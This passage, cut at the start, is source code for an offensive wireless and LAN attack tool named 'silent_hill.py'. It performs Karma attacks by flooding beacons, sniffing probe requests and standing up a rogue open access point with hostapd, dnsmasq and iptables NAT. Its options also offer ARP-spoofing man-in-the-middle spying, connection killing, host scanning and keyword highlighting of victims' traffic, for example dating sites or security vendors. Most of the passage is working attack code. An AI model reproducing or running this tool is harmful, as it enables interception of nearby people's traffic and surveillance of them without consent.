        r'on\s+\[[^\]]+\](\w+mon)\b',          # mac80211 format
        r'monitor mode enabled on (\w+mon)\b', # old format
        r'\(monitor mode enabled\)',
    ]

    for rgx in regexes:
        m = re.search(rgx, out)
        if m:
            if m.groups():
                interface = m.group(1)
            break

    # ---------- 2)  Fallback : maybe already on mon mode ----------
    if not m:
        try:
            info = subprocess.check_output(["iw", "dev", interface, "info"], text=True)
            if re.search(r'\btype\s+monitor\b', info):
                pass
            else:
                raise ValueError("not monitor yet")
        except Exception:
            # ---------- 3)  Scann all interfaces *mon -------------
            try:
                info = subprocess.check_output(["iw", "dev", interface, "info"], text=True)
                mode = re.search(r'\btype\s+(\w+)', info)
                if mode and mode.group(1) != "monitor":
                    raise ValueError(f"[!] {interface} is {mode.group(1)}, not monitor")            
            
            except Exception as e:
                print(f"[!] {R}Auto use of airmon on interface failed : \n{e}")
                print(f"{RESET}[!] {R}Try the manual way !{RESET}")
                exit(1)
    return interface

def restore_interface(interface, karma_mode):
    print(f"[*] Restoring interface {interface} to managed mode...")
    subprocess.call(["airmon-ng", "stop", interface])

    if karma_mode == "karma_on":
        pass
    elif karma_mode == "karma_off":
        subprocess.call(["service", "NetworkManager", "restart"])

def channel_hopper(scan_INTERFACE):
    try:
        while True:
            for ch in range(1, 14):
                os.system(f"iwconfig {scan_INTERFACE} channel {ch}")
                time.sleep(0.3)
    except KeyboardInterrupt:
        pass

def load_essid_list(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

ESSID_LIST = load_essid_list("ESSID.txt")

# Cannal hoping
def set_channel(interface, channel):
    os.system(f"iwconfig {interface} channel {channel}")

# Trame beacon
def generate_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS')
    essid = Dot11Elt(ID='SSID', info=ssid)
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96')
    frame = RadioTap()/dot11/beacon/essid/rates
    return frame

# Display infos
def clear_terminal():
    os.system('clear')

def display_status():
    with display_lock:
        clear_terminal()
        print(f"[Channel {current_channel}] - " + ", ".join(active_ssids))

        print("\n[!] Detected probes ESSID Clients:")
        print(f"{'MAC Adress':<20} {'ESSID Probe':<30}")
        print("-" * 50)
        for mac, ssid in seen_clients:
            print(f"{mac:<20} {ssid:<30}")

        print("\n[!] Detected Probe Responses (APs responding):")
        print(f"{'AP MAC':<20} {'ESSID (responded to)':<30}")
        print("-" * 50)
        for mac, ssid in probe_responses_seen:
            print(f"{mac:<20} {ssid:<30}")

# Thread Beacon
def beacon_loop(INTERFACE):
    global active_ssids, current_channel
    while not stop_event.is_set():
        for channel in random.sample(CHANNEL_LIST, len(CHANNEL_LIST)):
            if stop_event.is_set():
                break
            current_channel = channel
            set_channel(INTERFACE, channel)

            for _ in range(3):
                if stop_event.is_set():
                    break
                batch = random.sample(ESSID_LIST, BROADCAST_BATCH_SIZE)
                active_ssids = [ssid for ssid in batch if ssid]

                start_time = time.time()
                while time.time() - start_time < DWELL_TIME:
                    if stop_event.is_set():
                        break
                    for ssid, mac in zip(active_ssids, FIXED_MACS):
                        frame = generate_beacon(ssid, mac)
                        sendp(frame, iface=INTERFACE, verbose=0)
                    display_status()
                    time.sleep(0.1)

# Handler Sniff
def karma_packet_handler(pkt):
    if pkt.haslayer(Dot11):
        dot11 = pkt.getlayer(Dot11)

        # --- Probe Request (subtype 4) or Association Request (subtype 0) ---
        if dot11.type == 0 and dot11.subtype in [0, 4]:
            client_mac = dot11.addr2
            ssid = None

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except:
                        break
                    break
                elt = elt.payload.getlayer(Dot11Elt)

            if ssid:
                entry = (client_mac, ssid)
                if entry not in seen_clients:
                    with display_lock:
                        seen_clients.add(entry)
                    display_status()

        # --- Probe Response (subtype 5) ---
        elif dot11.type == 0 and dot11.subtype == 5:
            ap_mac = dot11.addr2
            ssid = None

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except:
                        break
                    break
                elt = elt.payload.getlayer(Dot11Elt)

            if ssid:
                entry = (ap_mac, ssid)
                if entry not in probe_responses_seen:
                    with display_lock:
                        probe_responses_seen.add(entry)

# Thread Sniff
def sniff_loop(INTERFACE):
    sniff(iface=INTERFACE, prn=karma_packet_handler, store=0, stop_filter=lambda x: stop_event.is_set())

########################## START KARMA AP ##########################
def run(cmd):
    print(f"{G}[+] {RESET}{cmd}")
    subprocess.run(cmd, shell=True, check=True)

def backup(file):
    if os.path.exists(file) and not os.path.exists(file + BACKUP_SUFFIX):
        shutil.copy(file, file + BACKUP_SUFFIX)

def write_file(path, content):
    with open(path, 'w') as f:
        f.write(content)

def setup():
    print("[*] Saving conf files ...")
    backup(HOSTAPD_CONF)
    backup(DNSMASQ_CONF)
    backup(SYSCTL_CONF)

    print("[*] Configuring hostapd ...")
    write_file(HOSTAPD_CONF, f"""interface={karma_interface}
driver=nl80211
ssid={ESSID_fakeAP}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
""")

    print("[*] Configuring dnsmasq ...")
    write_file(DNSMASQ_CONF, f"""interface={karma_interface}
dhcp-range=192.168.99.10,192.168.99.100,12h
""")

    print(f"[*] Preparing interface {karma_interface} ...")
    run(f"ip link set {karma_interface} down")
    run(f"ip addr flush dev {karma_interface}")
    run(f"ip addr add 192.168.99.1/24 dev {karma_interface}")
    run(f"ip link set {karma_interface} up")

    print("[*] Activating IP forwarding ...")
    run("sysctl -w net.ipv4.ip_forward=1")

    print("[*] Configuring NAT with iptables ...")
    run(f"iptables -t nat -A POSTROUTING -o {INTERNET_INTERFACE} -j MASQUERADE")
    run(f"iptables -A FORWARD -i {karma_interface} -o {INTERNET_INTERFACE} -j ACCEPT")
    run(f"iptables -A FORWARD -i {INTERNET_INTERFACE} -o {karma_interface} -m state --state ESTABLISHED,RELATED -j ACCEPT")

    print("[*] Launching hostapd and dnsmasq ...")
    run("systemctl start hostapd")
    run("systemctl start dnsmasq")

def get_default_gateway():
    gws = netifaces.gateways()
    default_gateway = gws.get('default')
    if default_gateway and netifaces.AF_INET in default_gateway:
        return default_gateway[netifaces.AF_INET][0]
    return None

########################## CONNECTED CLIENT KARMA AP ##########################
def is_reachable(ip):
    try:
        # Linux-style ping: -w 1 waits 1 second total for any reply
        result = subprocess.run(
            ["ping", "-w", "1", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return result.returncode == 0
    except Exception:
        return False

def monitor_connected_clients():
    print(f"[!] {Y}Monitoring connected clients ...{RESET}")
    print(f"[*] {Y}Listening ...{RESET}")

    client_status = {}  # mac -> "CONNECTED" or "DISCONNECTED"

    while True:
        try:
            if not os.path.exists(DNSMASQ_LEASES):
                print(f"{current_time()} {R}File {DNSMASQ_LEASES} not found{RESET}")
                return

            with open(DNSMASQ_LEASES, 'r') as f:
                lines = f.readlines()

            current_clients = {}  # Temp storage for current lease info

            for line in lines:
                parts = line.strip().split()
                if len(parts) >= 3:
                    mac = parts[1]
                    ip = parts[2]
                    hostname = parts[3] if len(parts) >= 4 else "?"
                    current_clients[mac] = (ip, hostname)

                    reachable = is_reachable(ip)
                    new_status = "CONNECTED" if reachable else "DISCONNECTED"
                    old_status = client_status.get(mac)

                    if old_status != new_status:
                        print(f"{current_time()} {Y}→ CLient detected:{RESET} {mac} | IP: {R}{ip}{RESET} | Hostname: {hostname} → {G if new_status == 'CONNECTED' else R}{new_status}{RESET}")
                        client_status[mac] = new_status
                else:
                    print(f"{current_time()} {R}Invalid record: {line.strip()}{RESET}")
            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[!] Stopping client monitor")
            break

########################## KILL KARMA AP ##########################
def restore(file):
    if os.path.exists(file + BACKUP_SUFFIX):
        shutil.move(file + BACKUP_SUFFIX, file)

def cleanup(signal_received=None, frame=None):
    run("systemctl stop hostapd || true")
    run("systemctl stop dnsmasq || true")
    run("iptables -F")
    run("iptables -t nat -F")
    run(f"ip addr flush dev {karma_interface}")

    restore(HOSTAPD_CONF)
    restore(DNSMASQ_CONF)
    restore(SYSCTL_CONF)

    run("sysctl -w net.ipv4.ip_forward=0")

    if os.path.exists(DNSMASQ_LEASES):
        os.remove(DNSMASQ_LEASES)
        print(f"{G}[+] {RESET}Lease file {DNSMASQ_LEASES} deleted")

    print(f"{G}[+] {RESET}Default configuration files restored")

########################## MAIN ##########################
def main():
    global victim_ips, gateway_ips, iface_spy, start_iface, karma_interface, INTERNET_INTERFACE, ESSID_fakeAP, highlight_keywords_list, current_channel, summary, MY_IP, PACKET_FILTER, EXCLUDE_SMB_FOLDERS
    print(banner)
    parser = argparse.ArgumentParser(description="Silence reveals what noise conceals")
    parser.add_argument("--network", "-n", help="IP range to scan (e.g., 192.168.1.0/24)")
    parser.add_argument("--discovery", "-d", help="Identify devices connected to the --network IP range", action='store_true')
    parser.add_argument("--connect", "-c", help="Test access to the --network IP range", action='store_true')
    parser.add_argument("--listen", "-l", help="Passive listening of communications to discover network devices on --interface", action='store_true')
    parser.add_argument("--spy", "-s", help="Passive MITM with communication analysis (--target, --router, and --interface required)", action='store_true')
    parser.add_argument("--exclude", "-e", help="Exclude packet analyzers from spy functions (comma-separated: HTTP,DNS,SMB,SSH,SSDP,TLS,ICMP,TCP,UDP,IP). TCP = Cleartext protocols (also contains UDP)", type=str)
    parser.add_argument("-es", help="Exclude smb folders content (enum only shares on SMB packets)", action='store_true')
    parser.add_argument("--highlight", "-hi", help="Keywords to highlight during --spy observation (ex : --highlight tinder,badoo,grindr,pornhub or : --highlight sentinelone,crowdstrike,company)", type=str)
    parser.add_argument("--kill", "-k", help="Kill ARP connexion from target (--target, --router, and --interface required)", action='store_true')
    parser.add_argument("--target", "-t", action="append", dest="targets", default=[], metavar="IP", help="Target IP to monitor (Supports multiple targets with a single router: -t 192.168.1.50 -t 192.168.1.51. Use only one -r when specifying multiple -t options.)")
    parser.add_argument("--router", "-r", action="append", dest="routers", default=[], metavar="IP",help="Network router IP (Supports multiple routers with a single target: -r 192.168.1.5 -r 192.168.1.254. Use only one -t when specifying multiple -r options.)")
    parser.add_argument("--interface", "-i", help="Network interface to use (e.g., eth0)")
    parser.add_argument("--karma-scan", "-ks", help="Sniff probe requests and show ESSIDs + MACs with --karma-interface", action="store_true")
    parser.add_argument("--karma", "-ka", help="Setup fake OPEN AP (Insert probed ESSID from karma attack for exemple). --karma ESSID_NAME (need an other interface : --karma-interface). Use --kill-karma to end AP")
    parser.add_argument("--karma-listen", "-kl", help="Listen for connected client to your fake Karma AP", action="store_true")
    parser.add_argument("--kill-karma", "-kk", help="End Karma AP", action="store_true")
    parser.add_argument("--karma-interface", "-ki", help="Interface for fake AP or for karma-scan (--karma-interface wlan0)")
    parser.add_argument("--karma-interface-internet", "-kit", help="Interface with internet access for fake AP (--karma-interface-internet wlan1)")
    parser.add_argument("--usages", "-u", help="Show some exemples of use and how to debug", action='store_true')
    args = parser.parse_args()
    
    PACKET_FILTER = {
        item.strip().upper()
        for item in args.exclude.split(",")
        if item.strip()
    } if args.exclude else set()

    if args.es:
        EXCLUDE_SMB_FOLDERS = True

    if len(sys.argv) == 1:
        parser.print_help()

    if args.usages:
        print(Debug_display)

    if len(args.targets) > 1 and len(args.routers) > 1:
        parser.error("Invalid arguments: use either multiple --target with a single --router, or multiple --router with a single --target.")

    if args.highlight:
        highlight_keywords_list = [w.strip().lower() for w in args.highlight.split(",")]

    if args.karma:
        if not args.karma_interface:
            print(f"[!] {R}Missing argument: --karma-interface")
            exit(1)
        if not args.karma_interface_internet:
            print(f"[!] {R}Missing argument: --karma-interface-internet")
            exit(1)

        ESSID_fakeAP = args.karma
        INTERNET_INTERFACE = args.karma_interface_internet
        karma_interface = set_monitor_mode(args.karma_interface, "karma_on")
        with open("conf_file_lastseen_interface", "w") as f:
            f.write(karma_interface)

        setup()
        router_ip = get_default_gateway()
        print(f"[!] Router IP: {Y}{router_ip}{RESET}")
        print(f"[!] Client range network: {Y}192.168.99.0/24{RESET}")
        print(f"[!] Traffic AP: {Y}{karma_interface}{RESET}")
        print(f"[!] {Y}Karma AP running ...{RESET}")
        print(f"[!] Discover clients: {Y}sudo python silent_hill.py -d -n 192.168.99.0/24 --interface {karma_interface}{RESET}")
        print(f"[!] Spy on clients: {Y}sudo python silent_hill.py -s -i {karma_interface} -r {router_ip} -t <TARGET_IP>{RESET}")
        print(f"[!] Close Karma AP: {Y}sudo python silent_hill.py --kill-karma{RESET}\n")

    if args.karma_listen:
        monitor_connected_clients()

    if args.kill_karma:
        print(f"[*] Restauring last karma interface name: {karma_interface}")
        with open("conf_file_lastseen_interface", "r") as f:
            data = f.read()
        karma_interface = data

        print(f"[*] Stoping monitor mode")
        restore_interface(karma_interface, "karma_on")

        print(f"[*] Restoring default configs")
        cleanup()

        print(f"[*] CLeaning last files")
        os.remove("conf_file_lastseen_interface")

        print(f"[*] If you have some trouble to restore interface name try: {Y}sudo ip link set {karma_interface} name <ORIGINAL_NAME>{RESET}")

    if args.karma_scan:
        if not args.karma_interface:
            print(f"[!] {R}--karma-interface is required for --karma-scan")
            sys.exit(1)

        signal.signal(signal.SIGINT, signal_handler3)
        start_iface = set_monitor_mode(args.karma_interface, "karma_on")

        current_channel = 1
        thread_beacon = threading.Thread(target=beacon_loop, args=(start_iface,))
        thread_sniff = threading.Thread(target=sniff_loop, args=(start_iface,))
        thread_beacon.start()
        thread_sniff.start()
        thread_beacon.join()
        thread_sniff.join()

    if args.kill:
        if not args.targets:
            print(f"[!] {R}Missing argument: --target")
            exit(1)
        if not args.routers:
            print(f"[!] {R}Missing argument: --router")
            exit(1)
        if not args.interface:
            print(f"[!] {R}Missing argument: --interface")
            exit(1)

        victim_ips.update(args.targets)
        gateway_ips.update(args.routers)
        iface_spy = args.interface

        signal.signal(signal.SIGINT, signal_handler2)
        kill_connection()

    if args.spy:
        if not args.targets:
            print(f"[!] {R}Missing argument: --target")
            exit(1)
        if not args.routers:
            print(f"[!] {R}Missing argument: --router")
            exit(1)
        if not args.interface:
            print(f"[!] {R}Missing argument: --interface")
            exit(1)

        victim_ips.update(args.targets)
        gateway_ips.update(args.routers)
        iface_spy = args.interface

        signal.signal(signal.SIGINT, signal_handler)
        enable_ip_forwarding()
        threading.Thread(target=spoof, daemon=True).start()
        sniff_traffic()

    if args.listen:
        if not args.interface:
            print(f"[!] {R}No --interface defined ...{RESET}")
            sys.exit(0)
        else:
            signal.signal(signal.SIGINT, signal_handler)
            if not oui_map:
                print("[!] OUI database empty or not found")

            MY_IP = get_if_addr(args.interface)
            summary = f"[*] Interface : {Y}{args.interface}{RESET} \n[*] Local IP  : {Y}{MY_IP}{RESET} \n[*] Passive sniffing in progress on {args.interface}... {R}(CTRL+C to stop){RESET}"
            print(summary)
            threading.Thread(target=print_summary, daemon=True).start()
            sniff(prn=packet_handler, store=False, iface=args.interface)

    if args.connect:
        signal.signal(signal.SIGINT, signal_handler)
        print(f"[*] {Y}Scanning in progress on {args.network} ...{RESET}")
        start_time = time.time()
        threads = []

        for ip in ipaddress.IPv4Network(args.network):
            t = threading.Thread(target=scan_host, args=(ip,))
            threads.append(t)
            t.start()

            while threading.active_count() > 100:
                time.sleep(0.01)

        for t in threads:
            t.join()

        duration = time.time() - start_time
        print(f"\n{C}=== Summary of detected hosts ==={RESET}")
        for ip, ports, services, infos in found_hosts:
            for p, s, info in zip(ports, services, infos):
                print(f"{ip}:{p} ({s}) --> {info}")
        print(f"\n{Y}Total time: {RESET}{duration:.1f}s")

    if args.discovery:
        signal.signal(signal.SIGINT, signal_handler)
        print("[*] Loading OUI database from oui.txt")
        if not oui_map:
            print(f"[!] {R}OUI database empty or not found{RESET}")

        devices = discover_network(args.network, args.interface, oui_map)
        print_devices(devices)

if __name__ == "__main__":
    main()
